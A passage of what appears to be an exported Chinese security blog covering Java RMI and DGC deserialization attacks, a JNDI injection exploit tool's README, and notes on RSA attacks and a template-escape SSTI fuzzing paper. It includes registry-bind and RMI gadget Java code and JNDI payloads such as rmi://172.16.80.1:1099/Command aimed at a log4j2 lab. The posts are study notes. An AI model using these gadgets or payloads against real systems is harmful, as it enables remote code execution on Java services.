和生成的动态代理类\n\n注册中心的工作：\n sun.rmi.transport.tcp.TCPTransport#handleMessages 会处理请求，其会调用serviceCall()\n\n跟进后首先会从 ObjectTable 中获取 Target 对象，并获取其中封装的UnicastServerRef以及RegistryImpl对象，接着调用 UnicastServerRef 的 dispatch方法\n\ndispatch方法在判断当前对象是否存在skel属性后，选择调用oldDispatch方法\n\n里面可以看到调用skel属性也就是RegistryImpl_Skel类的 dispatch 方法\n\n该方法会根据前面流中获取到的不同操作类型分发给不同的方法处理，这里在注册绑定时会选择0，也就是会从流中继续读取内容，反序列化并调用 RegistryImpl 的 bind 操作进行绑定\n\n\n服务调用\n客户端同服务端一样也是先本地创建RegistryImpl_Stub对象，接下来看 lookup 操作。就是将字符串序列化写入流，再等待服务端结果并反序列化流\n\n对于 Registry 端，调用RegistryImpl_Skel 的 dispatch 方法，这里将分发到2中，先反序列化输入流，调用RegistryImpl的 lookup 方法并将结果序列化写回\n\nClient端拿到的结果在前面远程对象注册的流程中我们已经知道：\n\nClient 拿到 Registry 端返回的动态代理对象并且反序列化后，对其进行调用，这看起来是本地进行调用，但实际上是动态代理的 RemoteObjectInvocationHandler 委托 RemoteRef 的 invoke 方法进行远程通信，由于这个动态代理类中保存了真正 Server 端对此项服务监听的端口，因此 Client 端直接与 Server 端进行通信。\n\n那么这时，服务端由 UnicastServerRef 的 dispatch 方法来处理客户端的请求。其会先接受客户端传来的目标调用方法的hash，与this.hashToMethod_Map中的元素进行匹配，如果有则进一步反序列化参数并反射调用目标方法\n\n执行完后将结果序列化传回给客户端\n\n总结\n这里贴一下su18师傅NB的总结\n\n\nRMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：\n\nRMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。\nStub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。\nRemoteCall 序列化 RMI 服务名称、Remote 对象。\nRMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。\nRMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。\nSkeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。\nSkeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。\nRMI 客户端反序列化服务端结果，获取远程对象的引用。\nRMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。\nRMI 客户端反序列化 RMI 远程方法调用结果。\n\n\n\n\n\n攻击 RMI\n\n恶意服务参数\n客户端在获取到服务端创建的 Stub 后，如果要调用这个 Stub 并传递参数， Stub 会序列化这个参数并传递给 Server 端，后者会反序列化该参数并调用本地的指定方法。如果该参数是 Object 类型的话，将触发反序列化漏洞\n这里以 CC6 为例：\n\n下面讨论当服务端参数和客户端参数不一致的情况\n直接运行将会报错，提到调用方法未识别到\n\n究其原因是因为在服务端由 UnicastServerRef 的 dispatch 方法来处理客户端的请求时，对于调用方法的hash并未在hashToMethod_Map找到\n\n那么我们需要一种方法能做到，既传递正确方法的hash值，同时传递的参数还是能导致恶意反序列化的类，su18师傅总结了一下4种方法：\n\n通过网络代理，在流量层修改数据 https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg\n自定义 “java.rmi” 包的代码，自行实现\n字节码修改 agent技术https://www.anquanke.com/post/id/200860\n使用 debugger \n\n这里首先以 debugger 为例，我们已经知道在远程调用时实际发生在 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法中进行委派的，我们可以在这里下断点并动态更换 method 的参数类型\n\n更换之后再继续执行即可触发恶意反序列化\n\n再看反序列化逻辑，可以得出结论：\n\nServer 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞\n\n\n\n动态类加载\nServer端限制条件：\n\n加载并配置 SecurityManager\n设置java.rmi.server.useCodebaseOnly=false\n\n\nServer 端调用 UnicastServerRef 的 dispatch 方法处理客户端请求，调用 unmarshalParameters 方法反序列化客户端传来的参数。\n\n一直会调用到unmarshalValue方法进行原生readObject反序列化，其实际由RMI封装类 MarshalInputStream 来实现，先反序列化读取客户端传来的codebase设置的地址，并判断是否设置了 useCodebaseOnly 选项，调用 RMIClassLoader 的 loadClass 方法加载类\n\n这部分流程还不太会调试，先跟着su18师傅的来。之后实际委派的是 LoaderHandler 类，进一步会调用到 loadClassForName 方法\n\n通过 Class.forName() 传入自定义类加载器 LoaderHandler$Loader 来从远程地址加载类\n\n\n关于  LoaderHandler$Loader 内部类，它是URLClassLoader的子类，最终 loadClass 时还是调用的父类的方法\n\njava.rmi.server.codebase只要一端配置即可触发远程类加载，因此利用方法如下：\n\n因此 Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 java.rmi.server.codebase 地址中远程加载恶意类而触发攻击\n\n\n替身攻击\n也是一种绕过调用方法参数类型限制的思路，可以手动添加目标参数类型为指定恶意反序列化的父类，来绕过RMI的校验机制，不过这需要对类进行重写\n\n\n\n攻击 Registry 端\n对于 Server 端在向注册中心绑定远程对象时，注册中心一方正常的操作时反序列化这个类并最终存在 RegistryImpl 的 bindings 中。那么如果这时传递一个恶意的序列化对象，则会在反序列化时触发漏洞。\n这里需要注意的细节是对于待 bind 的远程对象的要求，需要继承 Remote 接口，可以采用动态代理的方式\npublic static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.getRegistry(1099);        // 使用 AnnotationInvocationHandler 动态代理 Remote        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];        constructor.setAccessible(true);        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;racerz&quot;, getPayload());        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);        registry.bind(&quot;racerz&quot;, remote);    &#125;\n\n攻击 Client 端\n条件：攻击目标为 Client 端，Registry地址可控，或 Registry/Server 端可控\n可执行的攻击发生的位置：\n\n从注册中心获取调用服务的 Stub 并反序列化\n调用服务后获取远程对象执行的结果并反序列化\n\n攻击思路：\n\n恶意 Server Stub\n和前面攻击注册中心的思路一致，客户端 lookup 后拿到服务端注册在 Registry 的恶意代理对象并反序列化触发漏洞\n\n恶意 Server 端返回值\n思路类似攻击服务端的恶意参数，这里的恶意类放在调用目标方法的返回值处\n\n动态类加载\n\n同攻击 Server 端的动态类加载，Server 端返回给 Client 端不存在的类，要求 Client 端去 codebase 地址远程加载恶意类触发漏洞\n\n\n\n\n攻击 DGC\n\nDGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。\n\nRMI 定义了 java.rmi.dgc.DGC接口，并提供了两个方法：\n\ndirty: 客户端想要使用服务端上的远程引用或者使用到期还想继续用时调用\nclean: 客户端不再使用时调用\n\n\n java.rmi.dgc.DGC接口有sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl_Stub两种实现，同时还定义了 sun.rmi.transport.DGCImpl_Skel。这与 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel的命名以及之间的处理逻辑相对应。\n通信模式如下：\n\nServer 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 DGCImpl_Skel 来处理。\n\nDGCImpl_Skel 的 dispatch处理流程如下，也是通过原生反序列化的方式来处理对象\n\n那么如何利用攻击呢？\n\n根据 Client 端写入的标记来区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理，因此我们可以使用 DGC 来攻击任意一个由 JRMP 协议监听的端口，包括 Registry 端监听端口、RegistryImpl_Stub 监听端口、DGCImpl_Stub 监听端口（后两者监听端口是随机的）\n\n详情参见 yso 的 ysoserial.exploit.JRMPClient\n\n反序列化 Gadgets\n\nUnicastRemoteObject\n这个类是Remote接口实现类需要继承的父类，需要用到它的 exportObject 方法，看下它的反序列化流程：\n跟进 reexport 方法\n\n紧接着调用 exportObject 方法\n\n那么原理与远程对象创建时一致，监听JRMP协议端口，并对请求解析并反序列化\n\n可以配合 DGC 的处理逻辑来进行攻击\n\n这部分对应 yso 的  ysoserial.payloads.JRMPListener， 可以结合 ysoserial.exploit.JRMPListener来使用 \n\nysoserial 是使用了 UnicastRemoteObject 的子类 ActivationGroupImpl 作为实例，我们是直接使用 unsafe 直接创建了 UnicastRemoteObject 对象，没有使用子类，大同小异\n\npublic class UnicastRemoteObject1 &#123;    public static void main(String[] args) throws Exception &#123;        int port = 12233;        // 使用        Object uro = createInstanceUnsafely(UnicastRemoteObject.class);        Field field = UnicastRemoteObject.class.getDeclaredField(&quot;port&quot;);        field.setAccessible(true);        field.set(uro, port);        // 写入父类 RemoteObject 的 ref 属性防止 writeObject 时报错        writeObjectToFile(uro);        readFileObject();        // 保持进程        Thread.sleep(100000);    &#125;    public static Object createInstanceUnsafely(Class payloadClass) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        Constructor&lt;Unsafe&gt; constructor = Unsafe.class.getDeclaredConstructor();        constructor.setAccessible(true);        Unsafe unsafe = constructor.newInstance();        return unsafe.allocateInstance(payloadClass);    &#125;    public static void readFileObject() throws Exception &#123;        FileInputStream fio = new FileInputStream(&quot;test.bin&quot;);        ObjectInputStream inputStream = new ObjectInputStream(fio);        inputStream.readObject();    &#125;    public static void writeObjectToFile(Object obj) throws Exception &#123;        FileOutputStream fio = new FileOutputStream(&quot;test.bin&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fio);        oos.writeObject(obj);        oos.close();        fio.close();    &#125;&#125;\n调用链如下：\nUnicastRemoteObject.readObject()    UnicastRemoteObject.reexport()        UnicastRemoteObject.exportObject()            UnicastServerRef.exportObject()                LiveRef.exportObject()                    TCPEndpoint.exportObject()                        TCPTransport.exportObject()                            TCPTransport.listen()\n\nUnicastRef\n该类实现了 Externalizable 接口，因此反序列化时会调用 readExternal()方法\n其中调用了LiveRef.read()方法来还原ref属性\n\n跟进，其会先创建一个LiveRef实例，并调用DGCClient.registerRefs()方法在其环境中进行注册\n\n进一步会调用DGCClient$EndpointEntry#registerRefs() 方法\n\n里面继续调用makeDirtyCall()方法\n\nsinks点落在 DGCImpl_Stub 的 dirty 方法，即后面也可以利用攻击DGC的思路\n\n恶意服务端可以结合 ysoserial.exploit.JRMPListener 来使用\n\nRemoteObject\n该类几乎所有 RMI 远程调用类的父类，其 readObject 方法可以看到会先反序列化成员属性 ref ，并进一步调用该成员的 readExternal 方法，正好可以衔接前面的 UnicastRef 的Gadget\n\n这里利用的时候任取 RemoteObject 的一个子类即可触发，以 RMIServerImpl_Stub 为例\npublic class RemoteObject1 &#123;    public static void main(String[] args) throws Exception &#123;        String host = &quot;127.0.0.1&quot;;        int port = 12233;        ObjID id = new ObjID(new Random().nextInt());        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RMIServerImpl_Stub stub = new RMIServerImpl_Stub(ref);        //  ysoserial 中使用 RemoteObjectInvocationHandler//\t\tRemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);//\t\tRegistry proxy = (Registry) Proxy.newProxyInstance(RemoteObject1.class.getClassLoader(), new Class[]&#123;Registry.class&#125;, obj);        writeObjectToFile(stub);        readFileObject();    &#125;    public static void readFileObject() throws Exception &#123;        FileInputStream fio = new FileInputStream(&quot;test.bin&quot;);        ObjectInputStream inputStream = new ObjectInputStream(fio);        inputStream.readObject();    &#125;    public static void writeObjectToFile(Object obj) throws Exception &#123;        FileOutputStream fio = new FileOutputStream(&quot;test.bin&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fio);        oos.writeObject(obj);        oos.close();        fio.close();    &#125;&#125;\n这部分对应的就是 ysoserial.payloads.JRMPClient 这个 gadget，恶意服务端可以结合 ysoserial.exploit.JRMPListener 来使用。\n\n\n\n高级篇\n这里有一些更新的攻击思路 https://xz.aliyun.com/t/7932\nJEP 290\n在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新\n提供的几个机制：\n\n\n提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；\n限制反序列化的调用深度和复杂度；\n为 RMI export 的对象设置了验证机制；\n提供一个全局过滤器，可以在 properties 或配置文件中进行配置。\n\n\n关于 JEP290 的研究：\n\nhttps://paper.seebug.org/1689/\nhttps://paper.seebug.org/454/\nhttps://y4er.com/posts/bypass-jep290/\nJEP 290 的相关绕过方式 https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/\n\n这里摘录一些重点：\n\nJEP 290 涉及的核心类有： ObjectInputStream 类，ObjectInputFilter 接口，Config 静态类以及 Global 静态类。其中 Config 类是 ObjectInputFilter接口的内部类，Global 类又是Config类的内部类。\n\n\nObjectInputStream 总结\n\n到这里可以知道，serialFilter 属性就可以认为是 JEP 290 中的”过滤器”。过滤的具体逻辑写到 serialFilter 的checkInput 方法中，配置过滤器其实就是设置 ObjectInputStream 对象的 serialFilter属性。并且在 ObjectInputStream 构造函数中会赋值 serialFilter 为 ObjectInputFilter#Config 静态类的 serialFilter 静态字段\n\n\nConfig 静态类总结\n\nConfig 静态类在初始化的时候，会将Config.serialFilter 赋值为一个Global对象，这个Global 对象的filters字段值是jdk.serailFilter属性对应的 Function 列表。\n所以设置了 Config.serialFilter 这个静态字段，就相当于设置了 ObjectInputStream 类全局过滤器\n比如可以通过配置 JVM 的 jdk.serialFilter 或者 %JAVA_HOME%\\conf\\security\\java.security 文件的 jdk.serialFilter 字段值，来设置 Config.serialFilter ，也就是设置了全局过滤。\n\n\nGlobal类的总结\n\nGlobal 实现了ObjectInputFilter接口，所以是可以直接赋值到 ObjectInputStream.serialFilter 上。\nGlobal#filters 字段是一个函数列表。\nGlobal 类中的 chekInput 方法会遍历 Global#filters 的函数，传入需要检查的 FilterValues进行检查（FilterValues 中包含了要检查的 class, arrayLength，以及 depth 等）。\n\n\n过滤器\n\n设置过滤器本质就是设置 ObjectInputStream 的 serialFilter 字段值，设置过滤器可以分为设置全局过滤器和设置局部过滤器：\n1.设置全局过滤器是指，通过修改 Config.serialFilter这个静态字段的值来达到设置所有 ObjectInputStream对象的 serialFilter值 。具体原因是因为 ObjectInputStream 的构造函数会读取Config.serialFilter的值赋值到自己的serialFilter字段上，所有就会导致所有 new 出来的 ObjectInputStream对象的 serailFilter 都为Config.serialFilter的值。\n2.设置局部过滤器是指，在 new ObjectInputStream 的之后，再修改单个 ObjectInputStream 对象的 serialFilter 字段值。\n\n\n\n\n扩展\n开源针对攻击 RMI 的开源项目\n\nBaRMIe\nhttps://github.com/NickstaDB/BaRMIe\n模块展示：\nenum 功能，由  nb.barmie.modes.enumeration.EnumerationTask#run 方法实现，核心方法在 nb.barmie.modes.enumeration.RMIEnumerator#enumerateEndpoint 中\n\n也是先获取注册中心，通过探测不存在的服务名解绑是否会报错NotBoundException来判断是否可对目标注册中心进行操作\n\n之后创建了一个TCP代理，来获取与注册中心之间通信产生的数据报，并重新通过代理与注册中心一端进行通信。\n\nBaRMIe 从代理中读取流数据并自行实现解析逻辑，从而避免攻击者端在反序列化时由于没有具体接口而导致 “Class.forName” 报错。\n\n\n之后先通过list()获取注册中心的所有服务名，利用 lookup 方法去获取对应的服务对象动态代理\n\n这中间产生的流量会被 RMIReturnDataCapturingProxy 这个代理类捕获到，然后通过 RMIReplyDataParser 的 extractObjectDetails 方法解析远程服务对象的相关信息。\n\n\n枚举完成之后该模块会整理并打印获取到的远程服务对象的信息，以及是否能对此 Registry 进行 bind等一系列操作\n\n之后会调用 RMIAttackFactory.findAttacksForEndpoint()尝试遍历内置的RMI Attack来测试是否能匹配，判断方式利用函数 canAttackEndpoint()\n\n同时输出所有匹配到的攻击手段的详细信息\n\n看看内置的Attack 包括 Axiom 文件操作、SpringFramework 里的反序列化、JMX 反序列化、非法 bind 等\n\n进一步，如果可能存在反序列化攻击的话，就会继续查找所有的反序列化Gadget\n\n支持的反序列化 payload 如下\n\nattack 模块，由 nb.barmie.modes.attack.AttackMode#run 实现，还是先调用枚举模块测试，这里可以看到支持多个目标注册中心遍历测试\n\n接下来就是针对可攻击的目标进行攻击向量选择，呈现菜单的形式\n\n最终都会调用到 nb.barmie.modes.attack.RMIAttack 各个实现类的 executeAttack 方法\n\n\nRmiTaste\nhttps://github.com/NickstaDB/BaRMIe\n\n在参考了 BaRMIe 之后编写的攻击工具，并且结合 ysoserial 生成利用 gadget。其实 BaRMIe 也是用的 ysoserial 的 payload，但是 RmiTaste 是直接调用\n\n最关键的 attack 逻辑在 m0.rmitaste.rmi.exploit.Attack#invokeMethodPayload 方法中\n\n这与 攻击 Server 端时下断点修改的思路是一样的\n上述攻击的缺陷：\n\n本章内容并未覆盖\n不支持 JEP 290 的 bypass\n\n\n\n\nTO-DO\n\n\n目前能绕 JEP 290 的 POC 貌似都需要反连，服务器不出网，能不能绕？\nJRMP 协议解析及实现。\nDGC 层。\n攻击 Client 端实战 —— 反制红队 or 蜜罐。\n\n\nhttps://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg\n\n\nhttps://www.anquanke.com/post/id/200860\nhttps://xz.aliyun.com/t/7932\n\nhttps://paper.seebug.org/1689/\nhttps://paper.seebug.org/454/\nhttps://y4er.com/posts/bypass-jep290/\nJEP 290 的相关绕过方式 https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/\n\n","tags":["JAVA安全"]},{"title":"Twenty Years of Attacks on the RSA Cryptosystem","url":"/2022/11/05/RSA/","content":"写在前面为了写密码学作业，也为了深入了解RSA的各种攻击思路。通读一下Twenty Years of Attacks on the RSA Cryptosystem这篇paper，记录其中的一些方法思路和作者的论文写作风格，并结合密码挑战赛的题目加以练习。\nFactoring Large Integers我们将模数分解称为对RSA的蛮力攻击。尽管分解算法一直在稳步改进，但是当正确使用RSA时，当前的技术水平仍然远远没有对RSA的安全性构成威胁。分解大整数是计算数学中最美丽的问题之一，但并不是本文的主题。为了完整起见，我们注意到当前最快的因式分解算法General Number Field Sieve，其时间复杂度为\n\n((c+o(1)n^{1/3}log^{2/3}n))\\,\\,\\,\\,\\,\\,for\\, some\\, c","tags":["cryptography"]},{"title":"JNDI EXP 项目","url":"/2023/01/22/Readme/","content":"JNDI EXP——基于JNDI服务的Java漏洞利用工具项目地址：https://github.com/RacerZ-fighting/JNDI-EXP\n本项目是Java小白对前期学习内容的一个梳理和总结，并最终输出落地的小成果。\n本项目是基于 su18 师傅的 JNDI 以及 welk1n 师傅的 JNDI-Injection-Exploit，在他们的基础上拓展了小部分高版本绕过的姿势，以及采用了配置文件和命令行结合的方式来输入数据，本质上是一个轮子项目，但是自己学到了模块化集成与开发，知识点归纳的能力，这就足够了。\n功能工具启动后可以看到提供 RMI 和 LDAP 两种服务，根据用户命令行输入来启动指定的服务。同时后台有 Jetty 内置 web服务器用来接收处理重定向请求，返回攻击向量\n\n-s 参数指定使用的具体服务类型 rmi/ldap\nJNDI-RMI 提供的功能如下:\n\n-e 参数指定攻击利用选项，参考 su18 师傅对基本的利用做了归纳；-p 指定服务监听端口；-l 指定 Jetty 服务器监听的端口； -s 指定服务所在主机 ip；-o 指定了攻击向量的类型（低版本高版本绕过方式）\nJNDI-LDAP 提供的功能如下：\n\n与前面类似，不过这里 -g 参数用于在高版本绕过 codebase 限制时选择指定的反序列化利用gadget\n另外，搭配配置文件来指定具体的内容\n\n其中最后的 echo 选项指定回显方式\n安装使用git clone https://github.com/RacerZ-fighting/JNDI-EXP.gitjava -jar JNDIEXP-1.0-SNAPSHOT-all.jar -h\n使用展示这里以 vulhub 的 log4j2 靶场为例，对相关功能进行展示\n\n\nJNDI-RMI 攻击：\n\n\n\n生成 payload：rmi://172.16.80.1:1099/Command\n结合log4j2的payload注入靶场中对应的字段\n\n\n可以看到工具成功进行了回响，但是服务端无回显内容，查看OOB回显的DNS平台成功回显\n\n\nJNDI-LDAP 攻击：\n\n\n生成 payload: ldap://172.16.80.1:1099/Command\n结合log4j2的payload注入靶场中对应的字段\n\n\n同样在dns平台得到回显\n\n技术细节架构如下：\n\n回显技术以及通用的利用技术参考了 su18 师傅的实现。\n命令行处理模块利用了 picocli 这个命令行组件，收集齐所有参数。通过 -s 参数指定的服务类型分发给对应的服务端，启动并生成payload，处理发过来的请求。\n这里命令行组件可能存在线程问题，导致 ldap 服务端这里在发起端口监听之后程序就自动退出了，我这里作了简单的线程延时的缓解 Thread.sleep(100000);\nrmi 和 ldap 服务汇总了常见的利用思路：rmi 低版本远程类加载、高版本（8u131）通过本地工厂类加载（tomcat 和 groovy）；ldap 低版本远程类加载、高版本（8u191）通过传递反序列化链达到 RCE，具体细节可以参见：\n\nhttps://racerz-fighting.github.io/2023/01/11/JNDI/\n\n字节码生成模块使用了 idea 中的插件 ASM Bytecode Outline 生成，利用反射作粘合剂。su18师傅提到的未完成中提到使用 AdviceAdapter 的 onMethodEnter、onMethodExit更优雅的生成代码。我在这里做了尝试，但是没有成功，主要遇到如下几个问题：\nonMethodEnter 是基于 visitCode 方法进行封装的，所以插入字节码时要先弄清楚方法的起始点在哪里，这里在对构造函数进行处理时很容易乱；其次onMethodEnter 只允许对局部变量表当中的内容作修改，而不能改变操作数栈当中的状态，所以实现起来难度蛮大的\n参考https://github.com/su18/JNDI\nhttps://github.com/welk1n/JNDI-Injection-Exploit/\nhttps://javasec.org/\n","tags":["Java安全"]},{"title":"《Remote Code Execution from SSTI in the Sandbox Automatically Detecting and Exploiting Template Escape Bugs》论文笔记","url":"/2023/04/30/Remote%20Code%20Execution%20from%20SSTI%20in%20the%20Sandbox%20Aut%207020c30e8f32462281b933608ffc7d25/","content":"Remote Code Execution from SSTI in the Sandbox:Automatically Detecting and Exploiting Template Escape Bugs\n前置\n\n模板引擎\n  适用于前后端不分离的架构，后端接收请求数据后，将数据通过 模板引擎 解析渲染成视图后再返回给前端，由前端展示。可以简单理解为访问一个URL后直接得到html页面\n  模板引擎的作用就是实现逻辑与数据的分离，最终可将模板文件和数据通过模板引擎的渲染生成最终的HTML代码\n\n\nSSTI 漏洞成因\n\n服务端接收了攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎 在进行目标编译渲染的过程中(一般可以执行各种表达式)，执行了攻击者插入的可以破坏模板结构的语句(恶意Payload)，因而可能导致了敏感信息泄露、代码执行、GetShell等问题\n\n\n如何挖掘和判定？\n  利用模板表达式常用的特殊字符来尝试 fuzz 模板 \n  怎么判断是哪种模板引擎？\n\n报错信息\n根据执行结果（依赖于不同模板语言特性）\n\n\n\n\n模板逃逸漏洞\n  主要发生在基于设计的渲染引擎渲染过程中，由于模板代码的内容可控，可以在生成PHP代码的过程中逃离原本的语义，注入PHP代码造成 RCE\n\n\n\n\nAbstract\n  模板引擎在 web 应用中可以简化用户接口的开发，它所提供的强大能力可以被攻击者利用 SSTI 注入发起服务端的攻击，包括 RCE，因此现代模板引擎通常会提供沙箱机制作防御。\n  作者从一个模板引擎被忽视的沙箱绕过漏洞入手（模板逃逸），研究并解决了其利用手法对于模板引擎语法和渲染逻辑的依赖问题，结合最新技术开发出 TEFuzz 自动化检测利用工具，可应用于 PHP 的7款模板引擎上。\n\n研究动机\n  从一个 CVE 入手\n  公开的关于模板逃逸的漏洞很少，然而模板转换过程涵盖了模板代码解析和PHP代码生成两个部分，这涉及到大量复杂的字符串操作，因此模板逃逸漏洞在现实中不应该是罕见的，值得研究\n\nIntroduction\n\n模板逃逸漏洞概述\n  大部分模板引擎在渲染过程中采用基于生成的设计方案，即会在渲染过程中将模板文件转换成 PHP 文件，并执行。同时，通过缓存生成的 PHP 文件，渲染过程可以达到近乎原始PHP代码的执行性能。\n  由于模板引擎一些不恰当的实现，模板代码在渲染过程中可以逃离模板的语义导致注入PHP代码到生成的PHP文件当中。\n  威胁模型：\n  敌手的能力：\n\n直接形式的模板注入\n利用其它类型的漏洞如文件上传，造成模板文件被修改控制\n滥用 Web 应用的正常功能（如模板文件编辑功能）\n\n\n研究目标：开发一款自动化的工具来检测模板逃逸漏洞并检测它们的可利用性\n  面临的挑战：\n\n漏洞的根源——模板渲染逻辑，与语法分析紧密关联，难以理解和自动化推断\n输入 POC 很难构造，EXP 更难构造。需要调整 payload 以适应 PHP 文件中转义点（EP）的语义环境（EC）\n模板逃逸漏洞是基于语义层面的 bug ，很难去识别\n\n\n提出：针对模板逃逸漏洞设计的模糊测试框架 TEFuzz\n  动态测试结合了 Fuzz 的优势，避免了对于复杂模板语法的理解，并且利用了生成的 PHP 代码来方便检测漏洞和利用\n  技术问题转变到Fuzz的技术问题上：如何平衡探索和利用，即如何保证测试的代码覆盖率同时减少冗余的测试样例。\n\n\n\n\n\n![Untitled](Remote%20Code%20Execution%20from%20SSTI%20in%20the%20Sandbox%20Aut%207020c30e8f32462281b933608ffc7d25/Untitled%204.png)\n\n解决方案设计\n\n针对如何检测模板逃逸 bugs\n  Fuzz 原则1：平衡探索和利用。探索阶段：识别更多的 interesting testcases；利用阶段：将 interesing testcases 转换为 PoC\n  阶段1：基于探测的 Interesting Testcase 识别\n  magic string 插入，推断哪一部分被带入到了 PHP 代码中\n  阶段2：PHP语法引导的PoC生成\n  观察：payload 触发模板漏洞通常伴随着打破了原生成的 PHP 代码的结构\n  利用：包含一些 PHP 语法字符来打破代码结构（判断依据）\n  Fuzz 原则2：提高代码覆盖率同时避免冗余测试。\n  技术1：利用错误反馈自适应调整测试用例\n  观察：错误反馈信息通常会传达如何修复引起错误的测试样例；错误反馈信息种类较少\n  利用：半自动化的测试用例适配技术\n  技术2：利用运行时信息聚合测试用例\n  现有的 fuzz 框架的度量（代码覆盖 、调用栈信息） + 拓展\n\n针对如何利用模板逃逸 bugs\n  挑战：PoC 可能会在不同的上下文（EC）中破坏PHP代码结构，并且每个破坏的PHP代码结构都必须以其特定的方式修复\n  解决：上下文敏感的漏洞利用\n\n识别出 PHP 代码中 PoC 的转义上下文 EC\n调整 PoC 来保证注入的 PHP 代码符合对应的转义上下文\n贡献：总结了模板逃逸 bugs 的转义语义以及 payload 调整方法\n\n\n\n实现细节\n\n\n阶段一：Seed Collection\n 为每个模板引擎初始化测试样例。\n\nInteresting Testcase Identification\n 探测技术创建测试样例 + 错误反馈调整；聚合类似的 interested testcases\n\n 聚合的困难：聚合方法不应该依赖于模板语法的先验知识\n 提出语法无关的测试用例聚合技术，判断点1 相似的 interesting testcases 应该拥有相同的代码占用空间 ⇒ 代码覆盖率相同；判断点2 相同的 EP 点 ⇒ magic string 出现在 PHP 文件中的行号一样\n\nPoC 生成\n 语法制导测试样例突变技术 + 错误反馈调整 + PoC 聚合\n\n PoC 聚合：覆盖相似性评估 覆盖行号的 Jaccard index；EP相似性 包含 EP 点的 PHP 代码行之间的  edit distance\n\nHow to fix the TE Error?\n 人工收集错误信息并编写对应的修正规则：\n\nFile Adaption 创建对应文件并赋予可读权限\nGrammar Adaption missing params or attrs; unclosed symbols; unclosed tags\nAttribute Adaption 改变属性类型\n\n\nEXP 合成\n 识别生成 PHP 文件的转义上下文，调整 PoC 使其包含在 EC 中（闭合语句）\n\n如何识别转义上下文 EC\n  分类五种 EC：\n\n  在 AST 层面判断，Poc 本身会破坏 AST 结构难以定位 EP 点；用良性输入替换生成 PHP 文件的 AST ，对比识别出 EP 点及其归属的 EC \n  EXP 失效问题根源：忽略掉了模板代码解析过程？？？？\n\n如何正确闭合 PoC 在不同的 EC 中\n\n利用 EC 和 EP 来寻找对应的闭合 payload （闭合了 EP 之前的语句）\n闭合EP 之后的语句：单行注释符；同样依据 EC 和 EP 去寻找 payload\n在闭合语句中间插入 RCE 代码\n\n\n\n\n\n\n\n\n实验评测\n\nTE 数据集\n  拥有沙箱机制/不支持直接执行PHP代码；基于生成PHP式的模板渲染引擎；知名度\n\n  编写 TE 驱动；抽离每个TE的分界符；编写自适应规则\n\n种子收集\n  爬虫爬取文档中源代码相关的模板样例，正则编写抽取模板代码\n\n性能评估\n\n模板逃逸漏洞的普遍性和严重性\n\n 从 PoC 中可以总结出漏洞的成因：\n\n模板代码解析过程中验证不严\nPHP代码生成过程中过滤不严\n并总结了容易产生漏洞的模板引擎特征：\n\n复杂的模板语法\n\n模板变量直接映射为PHP变量\n“乐观”的模板代码解析原则\n生成PHP代码过程缺少过滤\n\n\n对比试验\n 与一款 SSTI 扫描器：tplmap 进行对比\n\n 角度1：tplmap 能否发现模板逃逸漏洞？\n 角度2：TEFuzz能否指导 tplmap 进行 RCE ？\n\n真实世界 Web 应用的漏洞挖掘能力\n\n针对已知漏洞\n 分析现存 CVE 中的 SSTI 漏洞的成因，评估其是否符合本文所构建的威胁模型，验证可行性；\n 针对实验中涉及到的存在漏洞的模板引擎，利用TEFuzz进行RCE利用探索。通过成功对 CMS 造成 RCE ，来证实模板逃逸漏洞的严重性\n\n针对 0day 漏洞\n 对比试验\n\n SSTI 扫描器 0 产出 ⇒  \n 检测依赖于 HTTP  